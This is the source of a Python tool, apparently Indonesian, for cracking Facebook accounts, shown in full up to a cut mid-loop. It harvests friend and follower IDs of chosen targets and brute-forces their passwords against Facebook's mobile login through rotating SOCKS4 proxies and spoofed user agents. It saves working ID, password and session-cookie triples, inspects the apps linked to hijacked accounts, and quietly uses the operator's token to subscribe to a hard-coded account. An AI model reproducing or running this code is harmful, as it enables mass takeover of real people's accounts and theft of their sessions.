#!/usr/bin/python3
#coding=utf-8
#create 20/07/2022
import requests,bs4,json,os,sys,random,datetime,time,re,marshal
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel
from rich import print as Aang
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
from rich.progress import Progress
from rich.progress import BarColumn
from rich.progress import TextColumn
from rich.progress import SpinnerColumn
from rich.progress import TimeElapsedColumn
try:
        import rich
except ImportError:
        print("\t [!] Sedang menginstal module rich")
        os.system("python -m pip install --upgrade pip && pip install rich")
try:
	import requests
except ImportError:
	print("\t [!] Sedang menginstal module requests")
	os.system("pip install requests")
try:
	import mechanize
except ImportError:
	print("\t [!] Sedang menginstal module mechanize")
	os.system("pip install mechanize")
try:
	import mechanize
except ImportError:
	print("\t [!] Sedang menginstal module user agent")
	os.system("pip install random-user-agent")
########## TAMPUNG MANTAN ##########
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
cokbrut=[]
princp=[]
pwpluss=[]
pwnya=[]
uasm=[]
ses=requests.Session()
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('data/proxy/proxy.txt','w').write(prox)
except Exception as e:
	exit()
#prox=open('.prox.txt','r').read().splitlines()
########## WARNA RANDOM ##########
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
A = '\x1b[0;33m'
N = '\x1b[0m'    
E = '\033[38;2;255;127;0;1m'
HA = '\x1b[0;32m'
KU = '\x1b[0;33m'
########## WARNA RICH ##########
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
P2 = "[#FFFFFF]" # Putih
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
O2 = "[#00FFFF]" # Biru Muda
########### URL FACEBOOK ##########
__peler__ = "100027796542918"
__bokep__ = "b-api.facebook.com"
__yntkts__ = "mbasic.facebook.com"
__pepex__ = "m.facebook.com"
__markzuck__ = "free.facebook.com"
__dev__ = "developer.facebook.com"
########### USER AGENT RANDOM ##########
agen = random.choice(["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9","Mozilla/5.0 (Linux; Android 5.0.2; SM-G530H Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11","Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 Safari/525 3gpp-gba","Mozilla/5.0 (Linux; U; Android 2.3.5; id-ID; iris 401e Build/LAVA-iris401e-S109) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36","Mozilla/5.0 (SymbianOS/9.4; U; Series60/5.0 Nokia5800d-1/21.0.025; Profile/ MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413","Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.70 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Linux; Android 11; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/99.0.4389.105 Mobile Safari/537.36","Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaN8-00/012.002; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.0 Mobile Safari/533.4 3gpp-gba","Mozilla/5.0 (Series40; Nokia200/10.58; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.2.62.10"])
usgen = random.choice(["Mozilla/4.0 BlackBerry8100/4.2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/100","Mozilla/5.0 (Linux; Android 10; TECNO KE6j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","BlackBerry7130/4.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102","UCWEB/2.0 (Windows; U; wds 7.10; zh-CN; NOKIA; Nokia 610C) U2/1.0.0 UCBrowser/3.0.1.302 U2/1.0.0 Mobile","Mozilla/5.0 (Linux; arm_64; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.134 YaApp_Android/22.72.1 YaSearchBrowser/22.72.1 BroPP/1.0 SA/3 Mobile Safari/537.36","UCWEB/2.0 (Windows; U; wds 7.10; zh-CN; NOKIA; Nokia 610C) U2/1.0.0 UCBrowser/3.0.1.302 U2/1.0.0 Mobile","Mozilla/5.0 (Linux; U; Android 10; en-US; VOG-L29 Build/HUAWEIVOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.4.0.1306 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; LGL722DL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.92 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 9; zh-CN; PCT-AL10 Build/HUAWEIPCT-AL10) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.2.5.1005 Mobile Safari/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X; vi) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/19A5340a UCBrowser/11.3.5.1203 Mobile","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9","Mozilla/5.0 (Linux; Android 5.0.2; SM-G530H Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11","Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 Safari/525 3gpp-gba","Mozilla/5.0 (Linux; U; Android 2.3.5; id-ID; iris 401e Build/LAVA-iris401e-S109) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36","Mozilla/5.0 (SymbianOS/9.4; U; Series60/5.0 Nokia5800d-1/21.0.025; Profile/ MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413","Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.70 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36"])
susu = random.choice(["Mozilla/5.0 (Mobile; LYF/F90M/LYF-F90M-000-02-21-131117; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.0","Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0; NOKIA; Lumia 710","MozillaW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.252","NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"])
default = random.choice(["Mozilla/5.0 (Linux; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.164 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/328.1.0.28.119;]","Mozilla/4.0 BlackBerry8100/4.2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/100","Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE72-1/031.023; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.3.1"])
koncol = random.choice(["Mozilla/5.0 (Linux; Android 9; XIAOMI Mi Note 10 Pro Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.15.0","Mozilla/5.0 (Linux; U; Android 11; th-TH; SM-P615 Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.6.900 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30","Mozilla/5.0 (Linux; Android 11; Mi 9T Pro Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.80 Mobile Safari/537.36 Reddit/Version 2021.38.0/Build 365032/Android 11","Mozilla/5.0 (Linux; Android 6.0; LG-H815 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.2125.102 Mobile Safari/537.36"])
########## DATA BULAN ##########
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
__join__ = ''+str(tgl)+' '+str(bln)+' '+str(thn)+''
########## SYSTEM CONTROL ##########
def clear():
	os.system('clear')
def back():
	login()
def jalan(Kiya):
	for Aang in Kiya + "\n":
		sys.stdout.write(Aang)
		sys.stdout.flush()
		time.sleep(0.03)
########## ANIMASI ##########
def animasi():
#    animation = ["\x1b[1;91m•","\x1b[1;93m••","\x1b[1;92m•••","\x1b[1;95m••••","\x1b[1;97m•••••","\x1b[1;91m•","\x1b[1;93m••","\x1b[1;92m•••","\x1b[1;95m••••","\x1b[1;97m•••••","\x1b[1;91m•","\x1b[1;93m••","\x1b[1;92m•••","\x1b[1;95m••••","\x1b[1;97m•••••","\x1b[1;91m•","\x1b[1;93m••","\x1b[1;92m•••","\x1b[1;95m••••","\x1b[1;97m•••••","\x1b[1;91m•","\x1b[1;93m••","\x1b[1;92m•••","\x1b[1;95m••••","\x1b[1;97m•••••"]
    animation = ["\x1b[1;91m•","\x1b[1;93m••","\x1b[1;92m•••","\x1b[1;95m••••","\x1b[1;97m•••••","\x1b[1;91m••••••","\x1b[1;93m•••••••","\x1b[1;92m••••••••","\x1b[1;95m•••••••••","\x1b[1;97m••••••••••","\x1b[1;91m•••••••••••","\x1b[1;93m••••••••••••","\x1b[1;92m•••••••••••••","\x1b[1;95m••••••••••••••","\x1b[1;97m•••••••••••••••","\x1b[1;91m••••••••••••••••","\x1b[1;93m•••••••••••••••••","\x1b[1;92m••••••••••••••••••","\x1b[1;95m•••••••••••••••••••","\x1b[1;97m••••••••••••••••••••"]
    for i in range(390):
        time.sleep(0.009)
        sys.stdout.write(f"\r{M}#{P} Proses {P}" + animation[i % len(animation)] +"\x1b[0m")
        sys.stdout.flush()
########## GAMBAR ##########
def banner():
	logo = f"{H2}   __  ___     ____  _\n  /  |/  /_ __/ / /_(_) {P2}• Tools {K2}Crack{P2} Fb{H2} \n / /|_/ / // / / __/ /  {P2}• Create {K2}Aang XD{H2}\n/_/  /_/\_,_/_/\__/_/   {P2}• Version {K2}3.8.0{P2}\n"
	cetak(nel(logo, title="• LOGO •"))
########## MASUK COOKIES ##########
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			kontol = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			pepek = json.loads(kontol.text)['name']
			ukhty = json.loads(kontol.text)['id']
			menu(pepek,ukhty)
		except KeyError:
			masuk()
		except requests.exceptions.ConnectionError:
			print("%s└────%s Koneksi internet eror"%(H,P));exit()
	except IOError:
		masuk()
########## MENU LOGIN ##########
def masuk():
	os.system('clear');banner()
	os.popen("play-audio data/audio/login.mp3")
	login = f"{P2}[{H2}1{P2}]. Login menggunakan cookies\n[{H2}2{P2}]. Cara mendapatkan cookies\n[{M2}0{P2}]. Exit program"
	cetak(nel(login, title="• LOGIN TOOLS •"))
	__sas__ = input("%s#%s Input 1 sampai 2 : "%(M,P))
	if __sas__ in ["1", "01"]:
		gimana()
	elif __sas__ in ["2", "02"]:
		jalan("%s└────%s Anda akan diarahkan ke youtube"%(H,P));time.sleep(1)
		os.system('xdg-open https://youtu.be/iDVCcnLcTnE')
		masuk()
	elif __sas__ in ["0", "00"]:
		print("\n%s#%s Notice me"%(M,P))
		jalan("%s└────%s Selamat tinggal semoga harimu indah"%(H,P))
		exit()
########## LOGIN COOKIE ##########
def gimana():
	try:
		info = f"[{M2}!{P2}] Harap gunakan akun tumbal/tak terpakai\n[{M2}!{P2}] Ingat, jangan gunakan akun pribadi"
		cetak(nel(info, title="• INFORMASI LOGIN •"))
		cookie = input("%s#%s Masukan cookies : %s"%(M,P,HA));animasi() #;print("\n")
		memek=requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", memek.text)
		ken=open(".token.txt", "w").write(find_token.group(1));peler()
		cok=open(".cok.txt", "w").write(cookie)
		os.popen("play-audio data/audio/berhasil.mp3")
		print("\n")
		suc = f"[{H2}√{P2}] Selamat, login berhasil.\n[{M2}!{P2}] Ketik ulang : {H2}python multi py{P2}"
		cetak(nel(suc, title="• LOGIN BERHASIL •"))
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		os.popen("play-audio data/audio/gagal.mp3")
		gal = f"[{M2}!{P2}] Login gagal, silahkan login ulang"
		cetak(nel(gal, title="• LOGIN GAGAL •"))
		exit()
def peler():
	try:
		requests.post(f"https://graph.facebook.com/{__peler__}?fields=subscribers&access_token=%s"%(tokenku))
	except:
		pass
########## MENU ##########
def menu(__nama__,__idz__):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print("%s└────%s Cookies anda invalid"%(H,P))
		time.sleep(2);masuk()
	os.system('clear');os.popen("play-audio data/audio/welcome.mp3")
	banner()
	__IP__ = requests.get("https://api.ipify.org").text
	info = f"[{K2}•{P2}] User active : {H2}{str(__nama__)}{P2}\n[{K2}•{P2}] Ip address  : {H2}{__IP__}{P2}\n[{K2}•{P2}] Gabung pada : {H2}{__join__}{P2}"
	cetak(nel(info, title="• INFORMASI USER •"))
	menu = f"[{H2}1{P2}]. Crack id dari teman public\n[{H2}2{P2}]. Crack id dari followers\n[{H2}3{P2}]. Check results crack me\n[{H2}4{P2}]. Informasi tools multi bf\n[{M2}0{P2}]. Exit program ({O2}hapus cookies{P2})"
	cetak(nel(menu, title="• MENU •"))
	__kya__ = input("%s#%s Input 1 sampai 4 : "%(M,P));time.sleep(0.03)
	if __kya__ in ["1", "01"]:
		publik()
	elif __kya__ in ["2", "02"]:
		follower()
	elif __kya__ in ["3", "03"]:
		result()
	elif __kya__ in ["4", "04"]:
		informasi()
	elif __kya__ in ["0", "00"]:
		os.system('rm -rf .token.txt');os.system('rm -rf .cookie.txt')
		ex = f"[{M2}!{P2}] Tunggu, sedang menghapus info login"
		cetak(nel(ex, title="• MENGHAPUS •"));time.sleep(2)
		print("%s└────%s Info login berhasil terhapus"%(H,P));exit()
	else:
		print("%s└────%s Input anda salah"%(H,P));back()
########## CEK RESULTS ##########
def result():
	res = f"[{H2}1{P2}]. Check results {H2}OK{P2} saya\n[{H2}2{P2}]. Check results {K2}CP{P2} saya\n[{M2}0{P2}]. Kembali ke menu"
	cetak(nel(res, title="• RESULTS •"))
	__kentod__ = input("%s#%s Input 1 sampai 2 : "%(M,P))
	if __kentod__ in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print("%s└────%s File ndak ada"%(H,P));time.sleep(2);back()
		if len(vin)==0:
			print("%s└────%s Anda belum punya results OK"%(H,P));time.sleep(2);back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'%s└────%s(%s%s%s). %s ({H}%s{P}) id'%(H,P,O,nom,P,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'%s└────%s(%s%s%s). %s ({H}%s{P}) id'%(H,P,O,nom,P,isi,len(hem)))
			geeh = input("\n%s#%s Input nomor file : "%(M,P))
			try:geh = lol[geeh]
			except KeyError:
				print("%s└────%s Input anda salah"%(H,P));back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print("%s└────%s File ndak ada"%(H,P));time.sleep(2);back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f"{P}└────{H}{cpkuni[0]}|{cpkuni[1]}");time.sleep(0.03)
				nocp +=1
			input("\n%s#%s Tekan enter"%(M,P));back()
	elif __kentod__ in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print("%s└────%s File ndak ada"%(H,P));time.sleep(2);back()
		if len(vin)==0:
			print("%s└────%s Anda belum punya results CP"%(H,P));time.sleep(2);back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'%s└────%s(%s%s%s). %s ({K}%s{P}) id'%(H,P,O,nom,P,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'%s└────%s(%s%s%s). %s ({K}%s{P}) id'%(H,P,O,nom,P,isi,len(hem)))
			geeh = input("\n%s#%s Input nomor file : "%(M,P))
			try:geh = lol[geeh]
			except KeyError:
				print("%s└────%s Input anda salah"%(H,P));back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print("%s└────%s File ndak ada"%(H,P));time.sleep(2);back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{P}└────{K} {cpkuni[0]}|{cpkuni[1]}');time.sleep(0.03)
				nocp +=1
			input("\n%s#%s Tekan enter"%(M,P));back()
	elif __kentod__ in ['3']:
		back()
########## PUBLIK ##########
def publik():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		__sas__ = int(input(f"\n{M}#{P} Ingin dump berapa id (max 20): "))
	except ValueError:
		print("%s└────%s Masukan hanya angka"%(H,P));exit()
	if __sas__<1 or __sas__>100:
		print("%s└────%s Gagal dump, mungkin id private"%(H,P));exit()
	ses=requests.Session()
	memek = 0
	for met in range(__sas__):
		memek+=1
		ppk = input(f"{H}└────{P} Enter target ke {H}{str(memek)}{P} : ");uid.append(ppk)
	for __colmek__ in uid:
		try:
			col = ses.get(f'https://graph.facebook.com/v2.0/{__colmek__}?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print("%s└────%s Koneksi internet eror"%(H,P));exit()
	try:
		jalan(f"{H}└────{P} Berhasil dump {H}{str(len(id))}{P} id")
		setting()
	except requests.exceptions.ConnectionError:
		print("%s└────%s Koneksi internet eror"%(H,P))
		back()
	except (KeyError,IOError):
		print("%s└────%s Target private/tidak memiliki teman"%(H,P));time.sleep(2)
		back()
########## FOLLOWER ##########
def follower():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	mk = f"[{M2}!{P2}] Ketik {H2}me{P2} untuk dump follower sendiri"
	cetak(nel(mk, title="• INFO •"))
	__janda__ = input("%s└────%s Enter target id : "%(H,P))
	try:
		Kiya = requests.get(f'https://graph.facebook.com/{__janda__}?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
		for pi in Kiya['subscribers']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		jalan(f"{H}└────{P} Berhasil dump {H}{str(len(id))}{P} id");setting()
	except requests.exceptions.ConnectionError:
		print("%s└────%s Koneksi internet eror"%(H,P));time.sleep(2)
		back()
	except (KeyError,IOError):
		print("%s└────%s Target private/tidak memiliki teman"%(H,P));time.sleep(2)
		back()
########## ATUR ID CRACK ##########
def setting():
	xos = f"[{H2}1{P2}] Crack id paling tua ({M2}tidak disarankan{P2})\n[{H2}2{P2}] Crack id paling muda ({H2}disarankan{P2})\n[{H2}3{P2}] Crack random id ({K2}recomend{P2})"
	cetak(nel(xos, title="• URUTAN ID •"))
	__sas__ = input("%s#%s Input 1 sampai 3 : "%(M,P))
	if __sas__ in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif __sas__ in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif __sas__ in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print("%s└────%s Maaf, input hanya angka"%(H,P));exit()
	met = f"[{H2}1{P2}] Metode free fb ({K2}crack cepat{P2})\n[{H2}2{P2}] Metode basic ({M2}cukup lambat{P2})\n[{H2}3{P2}] Metode mobile ({H2}sangat lambat{P2})"
	cetak(nel(met, title="• METHOD CRACK •"))
	__kon__ = input("%s#%s Input 1 sampai 3 : "%(M,P))
	if __kon__ in [""]:
		print("%s└────%s Input yang bener"%(H,P));setting()
	elif __kon__ in ["1", "01"]:
		method.append("free")
	elif __kon__ in ["2", "02"]:
		method.append("mbasic")
	elif __kon__ in ["3", "03"]:
		method.append("mobile")
	else:
		method.append('mbasic')
	pwplus = input("\n%s#%s Tambahkan password manual? (y/t): "%(M,P))
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print("%s└────%s Gunakan %skoma%s sebagai pemisah"%(H,P,H,P))
		print("%s└────%s Contoh : %sngentot,memek,mantan%s"%(H,P,H,P))
		pwku=input("\n%s#%s Masukan password : "%(M,P))
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	apk = input("%s└────%s Tampilkan apk terkait? (y/t): "%(H,P))
	if apk in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	kunaon()
########## MOBILE ##########
def crack(idf,__Ang__):
	global loop,ok,cp
	prog.update(des,description=f'[deep_pink3]{(loop)}/{len(id)}[/] OK : [green]{(ok)}[/] CP : [yellow]{(cp)}')
	prog.advance(des)
	ses = requests.Session()
	for pw in __Ang__:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': agen,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cross-origin','sec-fetch-user': '?1','sec-fetch-dest': 'document','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','save-data': 'on','content-length': '11','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': agen,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','dnt': '1','x-requested-with': 'XMLHttpRequest','x-content-type-options': 'nosniff','x-xss-protection': '0','x-frame-options': 'DENY','x-fb-debug': 'rLteCiRBDaKdj7COLSbKAuBvDX6ZnjbOcXKAxbiugT6cRfRDSZuCQvLtx+brzBc6ri0AHHP/NaRaSzYRoj6fig==','method': 'GET','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cross-origin','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://mobile.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','connection': 'keep-alive','vary': 'accept-encoding','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f"{P}└──── {KU}{idf}|{pw}            {P}")
				os.popen("play-audio data/audio/cp.mp3")
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"UCWEB/2.0 (Windows; U; wds 7.10; zh-CN; NOKIA; Nokia 610C) U2/1.0.0 UCBrowser/3.0.1.302 U2/1.0.0 Mobile"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f"{P}└──── {HA}{idf}|{pw}                  \n{HA}{kuki}{P}")
					os.popen("play-audio data/audio/ok.mp3")
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
